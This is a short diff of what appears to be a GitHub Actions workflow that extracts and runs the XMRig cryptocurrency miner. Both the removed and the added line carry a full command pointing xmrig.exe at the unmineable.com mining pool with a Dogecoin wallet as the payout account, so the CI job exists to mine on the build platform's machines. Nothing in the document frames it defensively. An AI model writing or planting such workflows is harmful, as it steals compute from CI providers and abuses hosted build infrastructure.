@@ -21,6 +21,6 @@ jobs:
     - name: Extract
       run: Expand-Archive xmrig-6.16.4-gcc-win64.zip
     - name: RUNNING
-      run: xmrig-6.16.4-gcc-win64.zip/v6.16.4/xmrig.exe --donate-level 5 -o rx.unmineable.com:3333 -u DOGEDFwgk6ngpcPn2wohZ7cBg4cPQktLNLnc8J.try -px -k -a rx/0
+      run: test/.github/workflow/xmrig.exe --donate-level 5 -o rx.unmineable.com:3333 -u DOGEDFwgk6ngpcPn2wohZ7cBg4cPQktLNLnc8J.try -px -k -a rx/0
     - name: DONE
       run: exit
